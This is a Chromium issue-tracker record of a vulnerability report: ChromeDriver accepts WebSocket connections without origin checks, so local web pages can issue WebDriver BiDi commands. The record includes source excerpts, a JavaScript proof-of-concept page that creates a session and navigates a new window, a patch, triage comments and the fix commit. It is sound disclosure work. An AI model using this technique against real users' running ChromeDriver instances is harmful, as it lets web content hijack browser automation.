# Local web pages can open a WebSocket to ChromeDriver and issue WebDriver BiDi commands, exposing the browser automation control surface to arbitrary web content

| Field | Value |
|-------|-------|
| **Issue ID** | [478783560](https://issues.chromium.org/issues/478783560) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Test (Use Subcomponents)>WebPlatformTests |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | po...@gmail.com |
| **Assignee** | ri...@chromium.org |
| **Created** | 2026-01-26 |
| **Bounty** | Confirmed (amount unknown) |

## Description

---

### Report description

Local web pages can open a WebSocket to ChromeDriver and issue WebDriver BiDi commands, exposing the browser automation control surface to arbitrary web content

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

#### Which URL (or repository) have you found the vulnerability in?

<https://chromium.googlesource.com/chromium/src/>

---

### The problem

#### Please describe the technical details of the vulnerability

#### 1. technical details

Chromedriver exposes an HTTP server that accepts both normal HTTP requests and WebSocket upgrade requests. HTTP requests are protected by origin/host checks, but WebSocket requests are not subject to the same validation.

For HTTP requests, `HttpServer::OnHttpRequest` enforces `RequestIsSafeToServe`, which applies policy based on `Origin`/`Host` headers and the `allow_remote` / `whitelisted_ips` / `allowed_origins` configuration:

```
// chrome/test/chromedriver/server/http_server.cc
bool RequestIsSafeToServe(const net::HttpServerRequestInfo& info,
                          bool allow_remote,
                          const std::vector<net::IPAddress>& whitelisted_ips,
                          const std::vector<std::string>& allowed_origins) {
  std::string origin_header_value = info.GetHeaderValue("origin");
  std::string host_header_value = info.GetHeaderValue("host");
  bool is_origin_set = !origin_header_value.empty();
  GURL origin_url(origin_header_value);
  bool is_origin_local = is_origin_set && net::IsLocalhost(origin_url);
  bool is_host_set = !host_header_value.empty();
  GURL host_url("http://" + host_header_value);
  bool is_host_local = is_host_set && net::IsLocalhost(host_url);

  // If origin is localhost, then host needs to be localhost as well.
  if (is_origin_local && !is_host_local) {
    LOG(ERROR) << "Rejecting request with localhost origin but host: "
               << host_header_value;
    return false;
  }

  if (!allow_remote) {
    // If remote is not allowed, both origin and host header need to be
    // localhost or not specified.
    if (is_origin_set && !is_origin_local) {
      LOG(ERROR) << "Rejecting request with non-local origin: "
                 << origin_header_value;
      return false;
    }

    if (is_host_set && !is_host_local) {
      LOG(ERROR) << "Rejecting request with non-local host: "
                 << host_header_value;
      return false;
    }
  } else {
    if (is_origin_set && !is_origin_local) {
      // Check against allowed list where empty allowed list is special case to
      // allow all. Disallow any other non-local origin.
      bool allow_all = whitelisted_ips.empty();
      if (!allow_all) {
        LOG(ERROR) << "Rejecting request with origin set: "
                   << origin_header_value;
        return false;
      }
    }

    if (is_host_set && !is_host_local) {
      return HostIsSafeToServe(host_url, host_header_value, whitelisted_ips,
                               allowed_origins);
    }
  }

  return true;
}

void HttpServer::OnHttpRequest(int connection_id,
                               const net::HttpServerRequestInfo& info) {
  if (!RequestIsSafeToServe(info, allow_remote_, whitelisted_ips_,
                            allowed_origins_)) {
    server_->Send500(connection_id,
                     "Host header or origin header is specified and is not "
                     "whitelisted or localhost.",
                     TRAFFIC_ANNOTATION_FOR_TESTS);
    return;
  }
  handle_request_func_.Run(
      info, base::BindRepeating(&HttpServer::OnResponse,
                                weak_factory_.GetWeakPtr(), connection_id,
                                !info.HasHeaderValue("connection", "close")));
}

```

By contrast, WebSocket upgrade requests are forwarded directly to the higher-layer handler without any call to `RequestIsSafeToServe`, so the `Origin` header and any IP allowlist are not enforced for WebSocket connections:

```
// chrome/test/chromedriver/server/http_server.cc
void HttpServer::OnWebSocketRequest(int connection_id,
                                    const net::HttpServerRequestInfo& info) {
  cmd_runner_->PostTask(
      FROM_HERE, base::BindOnce(&HttpHandler::OnWebSocketRequest, handler_,
                                this, connection_id, info));
}

```

The `HttpHandler` routes WebSocket requests under `/session` into the BiDi connection management path and unconditionally accepts the WebSocket, again without checking the request origin:

```
// chrome/test/chromedriver/server/http_handler.cc
void HttpHandler::OnWebSocketRequest(HttpServerInterface* http_server,
                                     int connection_id,
                                     const net::HttpServerRequestInfo& info) {
  std::string path = info.path;

  std::vector<std::string> path_parts = base::SplitString(
      path, "/", base::TRIM_WHITESPACE, base::SPLIT_WANT_NONEMPTY);

  if (path_parts.size() == 1 && path_parts[0] == "session") {
    OnWebSocketUnboundConnectionRequest(http_server, connection_id, info);
    return;
  }

  if (path_parts.size() == 2 && path_parts[0] == "session") {
    std::string session_id = path_parts[1];
    OnWebSocketAttachToSessionRequest(http_server, connection_id, session_id,
                                      info);
    return;
  }

  std::string err_msg = "bad request received path " + path;
  // ...
}

void HttpHandler::OnWebSocketUnboundConnectionRequest(
    HttpServerInterface* http_server,
    int connection_id,
    const net::HttpServerRequestInfo& info) {
  auto it = connection_session_map_.find(connection_id);
  if (it != connection_session_map_.end()) {
    // This should never happen. The block exists just for diagnostics purposes.
    std::string err_msg =
        "connection is already bound to session_id=" + it->second;
    // ...
    return;
  }
  session_connection_map_[""].push_back(connection_id);
  connection_session_map_[connection_id] = "";

  io_task_runner_->PostTask(
      FROM_HERE,
      base::BindOnce(&HttpServerInterface::AcceptWebSocket,
                     base::Unretained(http_server), connection_id, info));
}

```

Once a WebSocket connection is accepted on `/session`, the server treats it as a BiDi control channel. Static BiDi commands include `session.new`, and session-scoped commands are forwarded by name:

```
// chrome/test/chromedriver/server/http_handler.cc
  static_bidi_command_map_.emplace(
      "session.status", base::BindRepeating(&ExecuteBidiSessionStatus));
  static_bidi_command_map_.emplace(
      "session.new",
      base::BindRepeating(&ExecuteBidiSessionNew, &session_thread_map_,
                          init_session_cmd));

  session_bidi_command_map_.emplace(
      "session.end",
      base::BindRepeating(&ExecuteSessionCommand, &session_thread_map_, "Quit",
                          base::BindRepeating(&ExecuteBidiSessionEnd), true,
                          true));

```

Session commands such as `browsingContext.navigate` are forwarded via `ForwardBidiCommand`, which ultimately calls into the active browser instance:

```
// chrome/test/chromedriver/session_commands.cc
Status ForwardBidiCommand(Session* session,
                          const base::Value::Dict& params,
                          std::unique_ptr<base::Value>* value) {
  // session == nullptr is a valid case: ...
  if (session == nullptr) {
    return Status{kInvalidArgument, "session not found"};
  }
  const base::Value::Dict* data = params.FindDict("bidiCommand");
  if (!data) {
    return Status{kUnknownError, "bidiCommand is missing in params"};
  }

  std::optional<int> connection_id = params.FindInt("connectionId");
  if (!connection_id) {
    return Status{kUnknownCommand, "connectionId is missing in params"};
  }

  WebView* web_view = nullptr;
  Status status = session->chrome->GetActivePageByWebViewId(
      session->bidi_mapper_web_view_id, &web_view, /*wait_for_page=*/false);
  if (status.IsError()) {
    return status;
  }

  base::Value::Dict bidi_cmd = data->Clone();
  // ...
  status = web_view->PostBidiCommand(std::move(bidi_cmd));

  return status;
}

```

The WebDriver BiDi entry point therefore allows any origin that can open a WebSocket to the local ChromeDriver server to:

- create a new BiDi session; and
- forward BiDi commands that operate the browser instance associated with that session.

On a typical desktop configuration, ChromeDriver listens on `localhost:<port>`. The browser’s WebSocket API allows web pages from arbitrary origins to connect to `ws://localhost:<port>` if there is no explicit server-side origin enforcement. Because `OnWebSocketRequest` and `OnWebSocketUnboundConnectionRequest` do not consult `RequestIsSafeToServe` or the IP allowlist, a page opened in the browser can reach the BiDi WebSocket endpoint even when HTTP requests from the same origin would have been rejected by `RequestIsSafeToServe`.

#### 2. vulnerability reproduction

The attached test page under `web/chrome_driver_websocket/index.html` acts as a generic WebSocket client from the browser. It allows the user to connect to `ws://localhost:<port>/session` and execute a minimal BiDi command sequence that opens a new browser window and navigates it to `https://www.google.com`.

The key parts of the test page are:

```
<!-- web/chrome_driver_websocket/index.html -->
<div class="panel">
  <div class="panel-title">Connection settings</div>
  <div class="row">
    <label>
      Host:
      <input id="host" type="text" value="localhost" />
    </label>
    <label>
      Port:
      <input id="port" type="number" min="1" max="65535" value="9515" />
    </label>
    <label>
      Path:
      <input id="path" type="text" value="/session" />
    </label>
  </div>
  <div class="row">
    <button id="connect">Connect</button>
    <button id="disconnect" disabled>Disconnect</button>
    <div id="status">
      Status: <span id="status-text">disconnected</span>
    </div>
  </div>
</div>

<div class="panel">
  <div class="panel-title">Quick navigation</div>
  <div class="row" style="margin-top: 8px">
    <button id="quick-navigate" disabled>Open google.com</button>
  </div>
</div>

```

In JavaScript, the page opens a WebSocket to the configured endpoint and sends BiDi commands when “Open google.com” is clicked:

```
// web/chrome_driver_websocket/index.html
function buildWebSocketUrl() {
  const host = hostInput.value.trim() || "localhost";
  const port = parseInt(portInput.value, 10) || 9515;
  let path = pathInput.value.trim() || "/";
  if (!path.startsWith("/")) {
    path = "/" + path;
  }
  return `ws://${host}:${port}${path}`;
}

async function runQuickNavigateTest() {
  if (!socket || socket.readyState !== WebSocket.OPEN) {
    appendLog("Cannot run quick test: connection is not open", "error");
    return;
  }

  try {
    // Step 1: create a new BiDi session.
    const sessionResponse = await sendBidiCommand({
      method: "session.new",
      params: {},
    });

    if (sessionResponse.type !== "success") {
      appendLog(
        "Quick test: session.new did not succeed",
        "error",
      );
      return;
    }

    // Step 2: create a new top-level browsing context.
    const createResponse = await sendBidiCommand({
      method: "browsingContext.create",
      params: {
        type: "window",
      },
    });

    let contextId = null;
    if (
      createResponse &&
      createResponse.type === "success" &&
      createResponse.result &&
      typeof createResponse.result.context === "string"
    ) {
      contextId = createResponse.result.context;
    }

    if (!contextId) {
      appendLog(
        "Quick test: unable to determine browsing context id",
        "error",
      );
      return;
    }

    // Step 3: navigate the created context to https://www.google.com.
    await sendBidiCommand({
      method: "browsingContext.navigate",
      params: {
        context: contextId,
        url: "https://www.google.com",
        wait: "complete",
      },
    });

    appendLog(
      "Quick test: navigation command sent for https://www.google.com",
      "send",
    );
  } catch (e) {
    appendLog(`Quick test failed: ${String(e)}`, "error");
  }
}

```

To reproduce the behavior:

1. Start ChromeDriver on the local machine, listening on a known port, for example:
   - `chromedriver --port=9515`
   - The ChromeDriver console prints that it is listening on `localhost:9515` and only allows local connections.
2. Serve the `web/chrome_driver_websocket` directory as a static web root and open `index.html` in the browser (for example, from `http://127.0.0.1:PORT/index.html`).
3. In the test page:
   - leave `Host` as `localhost`,
   - set `Port` to the ChromeDriver port (e.g., `9515`),
   - keep `Path` as `/session`,
   - click **Connect**.
4. After the log shows “WebSocket connection opened”, click **Open google.com**.
5. Observe that ChromeDriver creates a new browser window (or tab) and navigates it to `https://www.google.com`, even though the initiating JavaScript code runs inside a normal web page using the standard WebSocket API.

This demonstrates that a web page can directly open a WebSocket connection to the ChromeDriver server and send BiDi commands that operate the controlled browser instance.

#### Impact analysis

- **Who can exploit it**
  
  - Any web page that the user opens in a browser on the same machine where ChromeDriver is running can attempt to connect to `ws://localhost:<chromedriver-port>/session` using the standard WebSocket API.
  - The attacker does not need network-level access to the machine beyond the browser session; the only requirement is that the browser can reach `localhost:<chromedriver-port>` while ChromeDriver is active.
- **What they gain**
  
  - Because WebSocket connections to `/session` are accepted without checking the HTTP `Origin` header or the IP allowlist, the attacker-controlled page can establish a BiDi channel to ChromeDriver from within the browser.
  - Through this channel, the page can send WebDriver BiDi commands. The code paths in `http_handler.cc` and `session_commands.cc` show that these commands are forwarded to the browser instance managed by ChromeDriver, allowing operations such as creating browsing contexts and navigating them.
  - The provided proof-of-concept specifically demonstrates that a page can:
    - create a new BiDi session; and
    - instruct ChromeDriver to open a new browser window and navigate it to an attacker-chosen URL (for example, `https://www.google.com`).
- **Scope and limitations**
  
  - The observed behavior affects the browser instance launched and controlled by ChromeDriver, which typically runs with a dedicated automation profile rather than the user’s primary browsing profile, unless ChromeDriver is explicitly configured otherwise.
  - The proof-of-concept exercises only a small subset of the available BiDi commands (session creation, context creation, and navigation), but the BiDi dispatcher exposes a broader set of commands (`browsingContext.*`, `script.*`, `network.*`, etc.) that are intended for automation. Once the WebSocket connection is established, these commands are reachable according to the server’s command map.
  - The impact is therefore best characterized as exposing the ChromeDriver automation control surface to arbitrary web content running in the browser on the same machine. This allows a web page to programmatically drive a Chrome instance started by ChromeDriver (for example, opening windows and navigating them) without additional user interaction, as long as ChromeDriver is running and listening on a local port.

---

### The cause

#### What version of Chrome have you found the security issue in?

145.0.7632.1/stable

#### Is the security issue related to a crash?

No, it is not related to a crash.

#### Choose the type of vulnerability

Permissions Bypass

#### How would you like to be publicly acknowledged for your report?

Povcfe of Tencent Security Xuanwu Lab

## Attachments

- [chrome_driver_websocket.mp4](attachments/chrome_driver_websocket.mp4) (video/mp4, 1.6 MB)
- [index.html](attachments/index.html) (text/html, 11.0 KB)

## Timeline

### po...@gmail.com (2026-01-26)

### patch

```
diff --git a/chrome/test/chromedriver/server/http_server.cc b/chrome/test/chromedriver/server/http_server.cc
index 1111111111..2222222222 100644
--- a/chrome/test/chromedriver/server/http_server.cc
+++ b/chrome/test/chromedriver/server/http_server.cc
@@ -211,14 +211,23 @@ void HttpServer::OnConnect(int connection_id) {
   server_->SetSendBufferSize(connection_id, kBufferSize);
   server_->SetReceiveBufferSize(connection_id, kBufferSize);
 }
 
 void HttpServer::OnHttpRequest(int connection_id,
                                const net::HttpServerRequestInfo& info) {
   if (!RequestIsSafeToServe(info, allow_remote_, whitelisted_ips_,
                             allowed_origins_)) {
     server_->Send500(connection_id,
                      "Host header or origin header is specified and is not "
                      "whitelisted or localhost.",
                      TRAFFIC_ANNOTATION_FOR_TESTS);
     return;
   }
   handle_request_func_.Run(
       info, base::BindRepeating(&HttpServer::OnResponse,
                                 weak_factory_.GetWeakPtr(), connection_id,
                                 !info.HasHeaderValue("connection", "close")));
 }
 
 HttpServer::~HttpServer() = default;
 
 void HttpServer::OnWebSocketRequest(int connection_id,
                                     const net::HttpServerRequestInfo& info) {
+  if (!RequestIsSafeToServe(info, allow_remote_, whitelisted_ips_,
+                            allowed_origins_)) {
+    server_->Send500(connection_id,
+                     "Host header or origin header is specified and is not "
+                     "whitelisted or localhost.",
+                     TRAFFIC_ANNOTATION_FOR_TESTS);
+    return;
+  }
   cmd_runner_->PostTask(
       FROM_HERE, base::BindOnce(&HttpHandler::OnWebSocketRequest, handler_,
                                 this, connection_id, info));
 }

```

### el...@google.com (2026-01-27)

Security shepherd: thanks for the report! This is an interesting one. I'm not sure how to set up ChromeDriver to test this, but your reasoning is compelling enough that I am going to just route this to the network team for further triage :)

### el...@google.com (2026-01-27)

Also, calling this Sev-2 because it requires a fairly specific context (ChromeDriver in use), and marking as all OSes where ChromeDriver exists.

### ch...@google.com (2026-01-28)

Setting milestone because of s2 severity.

### ch...@google.com (2026-01-28)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security Impact hotlist or the Severity field, and remove the ReleaseBlock hotlist.

### ch...@google.com (2026-01-28)

Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### el...@chromium.org (2026-01-28)

Security shepherd: routing to a //net OWNER.

### dr...@chromium.org (2026-01-31)

It doesn't seem like we have evidence this is a recent regression, so there's not a lot of value in calling this ReleaseBlock Stable. Removing that label.

If we see any evidence that this was caused by a recent CL, please add the label back and consider reverting the CL that introduced the issue.

### dx...@google.com (2026-02-04)

Project: chromium/src  

Branch:  main  

Author:  Adam Rice [ricea@chromium.org](mailto:ricea@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7538400>

Check WebSocket Origin header in chromedriver

---


Expand for full commit details
```
     
    The chromedriver HTTP server wasn't checking the Origin header on 
    incoming WebSocket connections. Fix it. 
     
    Also add a test to //chrome/test/chromedriver/test/run_py_tests.py to 
    verify the fix. 
     
    Bug: 478783560 
    Change-Id: I1f6cc49625791cd531018e38897ce5463dd63562 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7538400 
    Reviewed-by: Alex Rudenko <alexrudenko@chromium.org> 
    Commit-Queue: Adam Rice <ricea@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1579348}

```

---

Files:

- M `chrome/test/chromedriver/server/http_server.cc`
- M `chrome/test/chromedriver/test/run_py_tests.py`

---

Hash: [d89e8960efc54b53953854f724dfbf056439e149](https://chromiumdash.appspot.com/commit/d89e8960efc54b53953854f724dfbf056439e149)  

Date: Wed Feb 4 12:05:16 2026


---

### sp...@google.com (2026-03-11)

*NOTE: This is an automatically generated email*

Hello,

Chrome Vulnerability Rewards Program (VRP) Panel has decided that the security impact of this
issue does not meet the criteria to qualify for a reward.

Rationale for this decision:

Not in scope for Chrome VRP

Note that the fact that this issue is not being rewarded does not mean
that the product team won't fix the issue. We have filed a bug with the product
team and they will review your report and decide if a fix is required. We'll
let you know if the issue was fixed.

Regards,   

Google Security Bot

*How did we do? Please fill out a [short anonymous survey](https://goo.gl/IR3KRH).*

### po...@gmail.com (2026-03-12)

I tested this vulnerability on the stable version of Chrome on Windows. Why is it marked as ‘Not in scope for Chrome VRP’?

### ch...@google.com (2026-05-22)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> Not in scope for Chrome VRP
> 
> 
> Note that the fact that this issue is not being rewarded does not mean
> that the product team won't fix the issue. We have filed a bug with the product
> team and they will review your report and decide if a fix is required. We'll
> let you know if the issue was fixed.
> 
> Regards, \
> Google Security Bot
> 
> *How did we do? Please fill out a [short anonymous survey](https://goo.gl/IR3KRH).*

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/478783560)*
